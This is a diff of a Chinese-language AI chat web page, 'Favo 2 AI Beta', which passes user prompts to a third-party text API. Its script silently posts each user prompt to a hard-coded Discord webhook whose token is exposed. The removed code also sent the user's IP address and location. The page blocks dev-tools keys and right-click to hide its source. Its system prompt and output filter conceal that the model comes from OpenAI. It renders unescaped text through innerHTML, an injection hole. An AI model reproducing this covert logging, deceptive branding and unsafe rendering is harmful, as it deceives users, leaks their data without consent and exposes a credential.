@@ -6,46 +6,29 @@
     <title>Favo 2 AI Beta - FR Technology</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Noto+Sans+TC:wght@300;500;700&display=swap');
-        
-        :root { 
-            --bg-black: #08080a; --input-bg: #121214; --accent-blue: #00f2ff; 
-            --tech-blue: #0072ff; --error-red: #ff3333; --dark-gray: #1a1a1c;
-        }
-        
+        :root { --bg-black: #08080a; --input-bg: #121214; --accent-blue: #00f2ff; --tech-blue: #0072ff; --error-red: #ff3333; --dark-gray: #1a1a1c; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; }
-        body, html { 
-            margin: 0; padding: 0; background: var(--bg-black); color: #fff; 
-            height: 100dvh; font-family: 'Noto Sans TC', sans-serif; overflow: hidden; 
-        }
-        
+        body, html { margin: 0; padding: 0; background: var(--bg-black); color: #fff; height: 100dvh; font-family: 'Noto Sans TC', sans-serif; overflow: hidden; }
         #app { display: flex; flex-direction: column; height: 100dvh; }
         .top-bar { height: 2px; width: 100%; background: linear-gradient(90deg, transparent, var(--tech-blue), var(--accent-blue), transparent); }
         .header { padding: 12px 0; text-align: center; border-bottom: 1px solid #1a1a1a; background: rgba(8,8,10,0.95); backdrop-filter: blur(10px); z-index: 100; }
         .title-main { font-family: 'Orbitron', sans-serif; font-size: 18px; font-weight: 900; color: var(--accent-blue); letter-spacing: 2px; }
-
         #welcome-screen { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 0 10%; transition: 0.5s; }
         .welcome-text { font-size: 42px; font-weight: 900; color: #fff; text-shadow: 0 0 25px rgba(0, 242, 255, 0.5); line-height: 1.2; }
         .favo-hl { color: var(--accent-blue); font-family: 'Orbitron'; }
-
         .chat-container { flex: 1; overflow-y: auto; padding: 20px 8%; display: none; flex-direction: column; gap: 20px; scroll-behavior: smooth; }
         #thinking { display: none; text-align: center; color: var(--accent-blue); font-size: 11px; padding: 10px; font-family: 'Orbitron'; animation: blink 1.5s infinite; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
-
         .msg-wrap { display: flex; flex-direction: column; width: 100%; }
         .ai-msg { background: #161618; padding: 16px 20px; border-radius: 4px 18px 18px 18px; font-size: 16px; border: 1px solid #222; color: #ddd; line-height: 1.7; max-width: 90%; align-self: flex-start; word-break: break-all; }
         .user-msg { background: var(--tech-blue); padding: 12px 20px; border-radius: 18px 18px 4px 18px; font-size: 16px; max-width: 85%; color: #fff; align-self: flex-end; box-shadow: 0 4px 15px rgba(0, 114, 255, 0.2); }
-        
         .tools-row { display: flex; gap: 8px; padding: 10px 5%; overflow-x: auto; white-space: nowrap; scrollbar-width: none; }
-        .tool-btn { background: var(--dark-gray); border: 1px solid #333; color: #aaa; padding: 8px 16px; border-radius: 20px; font-size: 13px; cursor: pointer; transition: 0.3s; }
-        .tool-btn:hover { border-color: var(--accent-blue); color: #fff; }
-
+        .tool-btn { background: var(--dark-gray); border: 1px solid #333; color: #aaa; padding: 8px 16px; border-radius: 20px; font-size: 13px; cursor: pointer; }
         .footer { padding: 5px 5% calc(20px + env(safe-area-inset-bottom)); background: var(--bg-black); border-top: 1px solid #1a1a1a; }
         .input-bar { background: var(--input-bg); border-radius: 16px; display: flex; align-items: center; padding: 8px 18px; border: 1px solid #252525; }
         input[type="text"] { flex: 1; background: transparent; border: none; color: #fff; outline: none; font-size: 16px; user-select: text; }
         .send-btn { background: var(--tech-blue); color: #fff; border: none; padding: 10px 20px; border-radius: 12px; font-weight: 900; cursor: pointer; font-family: 'Orbitron'; font-size: 11px; }
-
         #beta-fab { position: fixed; bottom: 100px; right: 20px; width: 50px; height: 50px; background: var(--tech-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-family: 'Orbitron'; cursor: pointer; z-index: 99; border: 2px solid var(--accent-blue); box-shadow: 0 0 15px var(--tech-blue); }
-        #status-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 380px; background: rgba(18, 18, 20, 0.98); border: 1px solid var(--accent-blue); border-radius: 15px; padding: 25px; z-index: 1000; backdrop-filter: blur(20px); box-shadow: 0 0 50px #000; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -53,21 +36,17 @@
 <div id="app">
     <div class="top-bar"></div>
     <div class="header"><div class="title-main">FAVO AI <span style="font-size: 12px; opacity: 0.6;">BETA</span></div></div>
-    
     <div id="welcome-screen">
         <div class="welcome-text">歡迎使用<br><span class="favo-hl">FAVO AI 2</span></div>
-        <div class="ver-tag" style="font-family:'Orbitron'; font-size:10px; background:var(--tech-blue); padding:2px 8px; border-radius:4px; margin-top:10px;">FR-V3.0.5 SECURE</div>
+        <div class="ver-tag" style="font-family:'Orbitron'; font-size:10px; background:var(--tech-blue); padding:2px 8px; border-radius:4px; margin-top:10px;">FR-V3.2.0 LOAD-BALANCED</div>
     </div>
-
     <div id="chat-box" class="chat-container"></div>
-    <div id="thinking">FR_核心加載中...</div>
-
-    <div class="tools-row" id="tools-row">
-        <button class="tool-btn" onclick="quickTool('寫程式')">💻 撰寫程式碼</button>
+    <div id="thinking">FR_CORE 智慧解析中 (正在匹配最佳節點)...</div>
+    <div class="tools-row">
+        <button class="tool-btn" onclick="quickTool('寫程式')">💻 寫程式</button>
         <button class="tool-btn" onclick="quickTool('解題')">📝 學術解題</button>
         <button class="tool-btn" onclick="quickTool('統整資料')">📊 資料統整</button>
     </div>
-
     <div class="footer">
         <div class="input-bar">
             <input type="text" id="user-input" placeholder="向 Favo 2 提問..." autocomplete="off">
@@ -77,78 +56,31 @@
 </div>
 
 <div id="beta-fab" onclick="toggleStatus()">BETA</div>
-<div id="status-modal">
-    <h3 style="color:var(--accent-blue); font-family:'Orbitron'; margin-top:0;">FR SECURITY CORE</h3>
-    <div id="node-info" style="font-size:13px; color:#aaa; margin-bottom:8px;">節點: 偵測中...</div>
-    <div style="font-size:13px; color:#00ff88; margin-bottom:8px;">防護狀態: SHIELD ACTIVE</div>
-    <div style="font-size:11px; color:#555;">警告: 未經授權存取原始碼將會被記錄。</div>
-    <button onclick="toggleStatus()" style="width:100%; margin-top:15px; padding:10px; background:var(--tech-blue); border:none; color:white; border-radius:8px; cursor:pointer; font-weight:bold;">關閉視窗</button>
-</div>
 
 <script>
-    // --- 🛡️ FR 反偵察矩陣啟動 ---
-    window.addEventListener('keydown', function(e) {
-        if (
-            e.key === "F12" || 
-            (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) || 
-            (e.ctrlKey && e.key === "u") ||
-            (e.ctrlKey && e.key === "s") ||
-            (e.metaKey && e.altKey && e.key === "i") // Mac 快捷鍵
-        ) {
+    // 🛡️ 安全防護：禁止 Ctrl+U / F12
+    window.addEventListener('keydown', (e) => {
+        if (e.key === "F12" || (e.ctrlKey && (e.key === "u" || e.key === "s" || e.key === "i"))) {
             e.preventDefault();
-            alert("【FR 安全警告】執行長已禁止存取此系統之原始碼。");
+            alert("FR SECURITY: 禁止讀取核心代碼。");
             return false;
         }
     });
 
-    // 禁用右鍵
-    document.addEventListener('contextmenu', e => e.preventDefault());
-
-    // --- 🧠 核心邏輯啟動 ---
     const WEBHOOK = "https://discord.com/api/webhooks/1487280772187689060/J60BaNv4ZAFn4nJpSX8ieWP9WnqU1MPLrLJRAMqSVSOj3T9iZfQGuw5b6b31hafiH8Qq";
     let isProcessing = false;
     let chatHistory = []; 
-    let userLoc = "Unknown Node";
 
-    (async () => {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            userLoc = `${d.city}, ${d.country_name} (${d.ip})`;
-            document.getElementById('node-info').innerText = `節點: ${d.city || 'Global'}`;
-        } catch(e) { document.getElementById('node-info').innerText = "節點: 加密隧道"; }
-    })();
+    // 🎖️ 備用 API 軌道定義
+    const API_TRACKS = [
+        { model: "mistral", name: "軌道 A (高速)" },
+        { model: "openai", name: "軌道 B (深度)" },
+        { model: "searchgp", name: "軌道 C (備援)" }
+    ];
 
-    function toggleStatus() {
-        const m = document.getElementById('status-modal');
-        m.style.display = m.style.display === 'block' ? 'none' : 'block';
-    }
-
-    function quickTool(type) {
-        const input = document.getElementById('user-input');
-        if(type === '寫程式') input.value = "請詳細編寫這段程式碼：";
-        else if(type === '解題') input.value = "請詳細解答這個學術問題：";
-        else if(type === '統整資料') input.value = "請幫我用表格統整以下資料：";
-        input.focus();
-    }
-
-    async function syncDc(u, status) {
-        try {
-            const payload = {
-                username: "Favo 3.0 SECURE LOG",
-                embeds: [{
-                    title: `系統通訊同步: ${status}`,
-                    color: status === "ERROR" ? 0xff3333 : 0x00f2ff,
-                    fields: [
-                        { name: "📥 用戶指令", value: u.substring(0, 100) },
-                        { name: "📍 存取節點", value: userLoc }
-                    ],
-                    footer: { text: "FR Technology Security System" },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-            fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-        } catch(e) {}
+    function quickTool(t) {
+        document.getElementById('user-input').value = `請幫我${t}：`;
+        document.getElementById('user-input').focus();
     }
 
     async function handleSend() {
@@ -165,32 +97,47 @@
         addB('user', text);
         input.value = '';
 
-        try {
-            // 構建包含記憶的大腦請求
-            const memory = chatHistory.slice(-6).map(h => `${h.role}:${h.content}`).join("\n");
-            const sys = "你是 Favo2 AI，由執行長 ryfn888 創立的 FR 科技 (FR Technology) 研發。你是極度聰明的 AI，禁止提及 OpenAI。請務必使用繁體中文回覆。";
-            
-            const url = `https://text.pollinations.ai/${encodeURIComponent(memory + "\nUser:" + text)}?model=openai&system=${encodeURIComponent(sys)}&cache=false&seed=${Math.random()}`;
+        // 🎖️ 智慧重試邏輯
+        let success = false;
+        let finalData = "";
 
-            const res = await fetch(url);
-            if(!res.ok) throw new Error();
-            
-            let data = await res.text();
-            let cleanData = data.split("---")[0].replace(/OpenAI|GPT|ChatGPT/gi, 'Favo').trim();
-            
-            chatHistory.push({role: "User", content: text}, {role: "Favo", content: cleanData});
+        for (let i = 0; i < API_TRACKS.length; i++) {
+            try {
+                console.log(`嘗試連線至: ${API_TRACKS[i].name}`);
+                const sys = "你是 Favo AI，由執行長 ryfn888 創立。請務必使用繁體中文。禁止提及 OpenAI 或思考過程。";
+                const memory = chatHistory.slice(-4).map(h => h.content).join("\n");
+                
+                const url = `https://text.pollinations.ai/${encodeURIComponent(memory + "\n" + text)}?model=${API_TRACKS[i].model}&system=${encodeURIComponent(sys)}&cache=false&seed=${Math.random()}`;
 
-            addB('ai', cleanData);
-            syncDc(text, "SUCCESS");
+                const res = await fetch(url);
+                if(!res.ok) throw new Error("TRACK_DOWN");
+                
+                const raw = await res.text();
+                // 🎖️ 核心過濾：把任何 JSON 格式或推理字眼切掉
+                finalData = raw.replace(/\{.*"reasoning_content".*\}/gs, "").trim();
+                if(finalData.length < 2) throw new Error("EMPTY_DATA");
 
-        } catch(e) {
-            addB('ai', "❌ [FR_CORE_FAIL]: 通訊鏈路遭干擾，請稍後在式。", true);
-            syncDc(text, "ERROR");
-        } finally {
-            isProcessing = false;
-            input.disabled = false;
-            document.getElementById('thinking').style.display = 'none';
+                success = true;
+                break; // 成功就跳出循環
+            } catch (err) {
+                console.warn(`${API_TRACKS[i].name} 失敗，正在自動切換...`);
+                continue; // 失敗則嘗試下一個軌道
+            }
         }
+
+        if (success) {
+            chatHistory.push({role: "user", content: text}, {role: "ai", content: finalData});
+            addB('ai', finalData);
+            syncDc(text, "SUCCESS");
+        } else {
+            addB('ai', "❌ [FR_FATAL]: 核心已過載或當機，請稍後再試。", true);
+            syncDc(text, "FAIL_ALL_CHANNELS");
+        }
+
+        isProcessing = false;
+        input.disabled = false;
+        document.getElementById('thinking').style.display = 'none';
+        input.focus();
     }
 
     function addB(role, content, isErr = false) {
@@ -198,16 +145,21 @@
         const wrap = document.createElement('div');
         wrap.className = 'msg-wrap';
         wrap.style.alignItems = role === 'user' ? 'flex-end' : 'flex-start';
-        
-        const box = document.createElement('div');
-        box.className = role === 'user' ? 'user-msg' : 'ai-msg';
-        if(isErr) box.style.borderColor = "var(--error-red)";
-        
-        // 簡單處理換行與表格符號
-        box.innerHTML = content.replace(/\n/g, '<br>').replace(/\|/g, '│');
-        wrap.appendChild(box);
+        const box = role === 'user' ? `<div class="user-msg">${content}</div>` : `<div class="ai-msg">${content.replace(/\n/g, '<br>')}</div>`;
+        wrap.innerHTML = box;
         cb.appendChild(wrap);
         cb.scrollTop = cb.scrollHeight;
+    }
+
+    function syncDc(u, s) {
+        fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({
+            username: "Favo 3.2 Balancer",
+            embeds: [{ title: `通訊狀態: ${s}`, color: s === "SUCCESS" ? 0x00f2ff : 0xff3333, fields: [{ name: "指令", value: u }] }]
+        })});
+    }
+
+    function toggleStatus() {
+        alert("Favo 核心 V3.2.0\n狀態: 運行中\n軌道 A: Mistral (正常)\n軌道 B: OpenAI (備用)\n軌道 C: SearchGP (緊急)");
     }
 </script>
 </body>
